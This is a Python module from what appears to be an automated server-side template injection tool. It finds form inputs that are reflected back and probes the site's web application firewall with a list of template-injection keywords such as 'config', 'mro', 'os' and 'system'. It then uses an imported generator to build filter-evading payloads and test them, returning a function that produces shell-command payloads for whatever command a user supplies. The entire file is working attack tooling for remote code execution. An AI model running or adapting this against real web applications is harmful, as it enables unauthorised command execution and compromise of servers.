import random
import time
import logging

from functools import wraps, partial, lru_cache
from collections import Counter
from typing import Iterable
from itertools import groupby

from .shell_cmd import exec_cmd_payload
from .request import common_request
from .form import Form, fill_form, random_fill


logger = logging.getLogger("test_form")


def get_possible_input(url: str, form):
    """
    test the form and return inputs that might be vulunable
    """
    fill = random_fill(form)
    kwargs = fill_form(url, form, fill)
    
    resp = common_request(**kwargs)
    return [
        k for k, v in fill.items()
        if v in resp.text
    ]


def submit_form_input(url: str, form: dict, inputs: dict):
    """
    submit the form inside the url with the inputs
    """
    logger.info(f"submit inputs={inputs}")
    if any(len(v) > 2048 for v in inputs.values()) and form["method"] == "GET":
        logger.warning(
            "some inputs are extremely long that the request might fail")
    kwargs = fill_form(url, form, inputs)
    resp = common_request(**kwargs)
    return resp


def test_dangerous_keywords(url, form, input_field):
    """
    test some dangerous keywords and return some hashes of response text.
    the hashes represent what the result would be when inputs get WAF.
    """
    keywords = [
        "config", "self", "os", "class", "mro", "base", "request",
        "attr", "open", "system",
        "[", '"', "'", "_", ".", "+", "{{", "|",
        "0", "1", "2",
        "０", "１", "２",
    ]
    resps = {
        keyword: submit_form_input(url, form, {input_field: keyword * 10})
        for keyword in keywords
    }
    resp_hashes = [
        hash(resp.text) for resp in resps.values()
        if resp.status_code != 500
    ]
    return [pair[0] for pair in Counter(resp_hashes).most_common(2)]


def check_waf(url, form, input_field, input_value, waf_hash):
    """
    submit a form and check whether the input get WAFed.
    if it is blocked return False otherwise return True
    """
    resp = submit_form_input(url, form, {input_field: input_value})
    return hash(resp.text) not in waf_hash


def test_form(url, form):
    """
    test whether a form is vulunable,
    if it is, return a function that generate shell command payload.
    """
    cmd = "echo y a  y;"

    logger.info(f"Start testing form, form={form}")
    possible_inputs = get_possible_input(url, form)
    logger.info(f"These inputs might be vulunable: {possible_inputs}")

    for possible_input in possible_inputs:

        logger.info(f"Tesing: {possible_input}")

        waf_hash = test_dangerous_keywords(url, form, possible_input)

        def waf_func(value): return check_waf(
            url, form, possible_input, value, waf_hash)

        waf_func = lru_cache(200)(waf_func)

        payload, will_print = exec_cmd_payload(waf_func, cmd)
        if payload is None:
            logger.info(f"Testing {possible_input} Failed.")
            continue

        if will_print:
            logger.warning(
                f"Input {repr(possible_input)} looks great, testing generated payload.")
            resp = submit_form_input(url, form, {possible_input: payload})
            if "y a y" in resp.text:
                logger.warning(f"Success! return a payload generator.")
            else:
                logger.warning(
                    f"Test Payload Failed! return a payload generator anyway.")
            return (lambda cmd: exec_cmd_payload(waf_func, cmd)[0]), possible_input
        else:
            logger.warning(
                f"Input {possible_input} looks great, but we WON'T SEE the execution result! " +
                "You can try using the payload generator anyway.")
            return (lambda cmd: exec_cmd_payload(waf_func, cmd)[0]), possible_input

    logger.warning(f"Failed...")
    return None, None
